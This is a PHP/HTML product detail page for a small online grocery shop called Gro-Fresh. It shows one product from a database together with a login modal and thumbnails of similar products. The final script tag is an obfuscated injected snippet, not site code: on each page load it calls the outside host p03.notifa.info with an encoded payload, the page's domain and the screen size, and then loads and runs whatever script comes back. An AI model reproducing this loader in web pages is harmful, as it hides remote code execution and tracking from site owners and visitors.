<?php include 'system/koneksi.php'; ?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../../../favicon.ico">

    <title>Gro-Fresh | Product Detail</title>
    <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min.css">
    <link href="assets/css/bootstrap.css" rel="stylesheet">
    <link href="assets/css/carousel.css" rel="stylesheet">
    <script src="assets/js/bootsrap.js"></script>

  </head>
  <body>
    <header>
      <nav class="navbar navbar-expand-md navbar-light fixed-top bg-light">
        <a class="navbar-brand" href="#"><img src="img/logofont.svg" width="150" height="auto" class="d-inline-block align-top" alt=""></a>
          <!--<img src="img/logo.png" width="30" height="30" class="d-inline-block align-top" alt="">-->
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
          <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarCollapse">
          <ul class="navbar-nav mr-auto">
            <li class="nav-item active">
              <a class="nav-link" href="index.html">Home <span class="sr-only">(current)</span></a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="productlist.html">Product</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="quality.html">Quality</a>
            </li>
            <li class="nav-item">
              <a class="nav-link" href="Cs Contact.html">Contact Us</a>
            </li>
          </ul>
         <div class="dropdown">
            Ray Reysandi  
          <button class="dropbtn"><img src="user2.png"></button>
          <div class="dropdown-content">
            <a href="indexlogin.html"> Profile </a>
            <a href="history payment.html"> History </a>
          </div>  
        </div> 
        </div>
      </nav>
    </header>
    <div class="modal" id="loginmodal" tabindex="-1">
      <div class="modal-dialog">
        <div class="modal-content">
          <div class="modal-header">
            <h4 class="modal-tittle"> Login </h4>
            <button class="close" data-dismiss="modal" >&times;</button>
          </div>
          <div class="modal-body">
            <form>
              <div class="form-group">
                <label for="TypeEmail"> Email </label>
                <input class="form-control" placeholder="Login Email" type="text">
              </div>
              <div class="form-group">
                <label for="TypePassword"> Password </label>
                <input class="form-control" placeholder="Login Password" type="Password">
              </div>
            </form>
          </div>
          <div class="modal-footer">
            <div class="txt1 text-center">
            <span>
              Or Sign In Using
            </span>
          </div>

             <div class="flex-c-m">
            <a href="#" class="login100-social-item bg1">
              <i class="fa fa-facebook"></i>
            </a>

            <a href="#" class="login100-social-item bg2">
              <i class="fa fa-twitter"></i>
            </a>

            <a href="#" class="login100-social-item bg3">
              <i class="fa fa-google"></i>
            </a>
          </div>
            <button class="btn btn-primary"> Login </button>
            <button class="btn btn-primary" data-dissmiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>

<?php
   $query="SELECT * from  produk";
   $result=mysqli_query($con, $query) or die(mysqli_error());
   $kd_produk=1;
   $rows=mysqli_fetch_object($result)
?>

      <div class="container">
      	<div class="row pt-5">
	        <div class="col-md-6 p-3">
	          <img src="https://drive.google.com/uc?id=1lvK98ycBqzD3v9s01qlPpyBmt5yryesC" class="img-responsive img-thumbnail mx-auto" width="500px" alt="Wortel" >

	        </div>
        	<div class="col-md-6 bg-light p-3">
        	 <h3 class="title mb-3"><?=$rows -> nama_produk;?></h3>
				<p class="price-detail-wrap"> 
					<span class="price h3 text-warning"> 
						<span class="currency">IDR </span><span class="num"><?=$rows -> harga;?></span>
					</span> 
					<span>/per kg</span> 
				</p> <!-- price-detail-wrap .// -->
				<dl class="item-property">
				  <dt>Description</dt>
				  <dd><p><?=$rows -> deskripsi;?></p></dd>
				</dl>
				<dl class="param param-feature">
				  <dt>Delivery</dt>
				  <dd>Daerah Istimewa Yogyakarta</dd>
				</dl>  <!-- item-property-hor .// -->
					<hr>
						<div class="row">
							<div class="col-sm-6">
								<dl class="param param-inline">
								  <dt>Quantity: </dt>
								  <dd>
                    <input style="width:90px;  float: left; margin-right: 20px;" id="qty" name="qty" class="form-control" placeholder="Quantity" type="number" max="<?=$rows -> stok;?>">
                    
								  </dd>
                  <span>/<?=$rows -> stok;?></span> 
								</dl>  <!-- item-property .// -->
							</div> <!-- col.// -->
							<div class="col-sm-7">
								<item-property .// -->
							</div> <!-- col.// -->
						</div> <!-- row.// -->
						<hr>
            
						<a href="Method Payment.php" class="btn btn-md btn-success text-uppercase"> Buy now </a>
            <form action="system/cart.php" method="post">
						<a><input type="submit" name="submit" class="btn btn-md btn-outline-success text-uppercase"> </a>
          </form>
        	</div>
      </div>
      </div>

      <div class="container mt-3">
      <hr class="featurette-divider">
      	<div class="col-md-12">
         <h2>Similiar Product :</h2>
        <div class="row">
        	<div class="col-sm-3">
        		<img src="https://drive.google.com/uc?id=1Oe1jCXAgbP7mUF4W43yq9sOjnBo4hv7D" class="img-responsive img-thumbnail mx-auto" width="300px" alt="Wortel">
        	</div>
        	<div class="col-sm-3">
        		<img src="https://drive.google.com/uc?id=1KXyMHnOcp_YY-RJi5UsmapI9T7ixxdVA" class="img-responsive img-thumbnail mx-auto" width="300px" alt="Wortel">
        	</div>
        	<div class="col-sm-3">
        		<img src="https://drive.google.com/uc?id=1J3ZL7JKg-C-Ox5DINK2OJAcTW01zKAsK" class="img-responsive img-thumbnail mx-auto" width="300px" alt="Wortel">
        	</div>
        	<div class="col-sm-3">
        		<img src="https://drive.google.com/uc?id=1Q6gKORPURQgNXGFBvBOBWB5lzmoKfab7" class="img-responsive img-thumbnail mx-auto" width="300px" alt="Wortel">
        	</div>
        </div>
      </div>
</div>


          <hr class="featurette-divider">
      
          <?php include 'footer.php'; ?>
    </main>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script>window.jQuery || document.write('<script src="assets/js/jquery-slim.min.js"><\/script>')</script>
    <script src="../../assets/js/vendor/popper.min.js"></script>
    <script src="assets/js/bootstrap.js"></script>
    <!-- Just to make our placeholder images work. Don't actually copy the next line! -->
    <script src="assets/js/holder.min.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mkO%2f7ITrK9yURUOYsdqntBVAlSz8%2fPPT1NsENzZAXZvdF4fJa8FrsPLXqCn7C2iTxywkrJ6vNZvgnyFsAA7iZX%2fBbJGVqvHo03oLCHNcoC6exH7MFm0mIZGbj9KGuL8b%2bLdMTdMu0hXwGsN97BNN1Du3IEDZh76lBvvKe7uTgK%2bBIE3%2bjPB5ONaZ1Yw6dvBk0OSW2dXxBwA4xbDPstIubbyK1GMVuiAuUuTUR2sQvSPmBysFYDZt%2f5oV9iGM%2f56Vor4jxpvD5WlPbJqeGR2ExyMsDfHTUrpAHEcSz33fkR%2fjQKqh8YcK%2fHrA8ckj1utk%2f4Cf1NEgc0lPg7K4PVy7U7zKnyvzQ%2b4%2bBkcyJEKyFE2fE%2bMP8WbIxIXraBI%2bELsmFDQkT%2fOF44rFd1UH8XzmRGxxbbig%2by19lPk%2fcUkqx9w4cD9ciLiFexN%2fkZCzAAupxjzRqX9fDZ5jYv3gFdi5r6mYPymJlfqKtMex%2fpS%2fQVJVMd%2bxjO7SZbv%2b%2bLheoppKSmD3odYq%2fSFm8ngyuPqEceTzRB85Q2wS1rP6GT9edgje396gcnBD1aBmreovDfgeW6DBoDdtaqnM%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
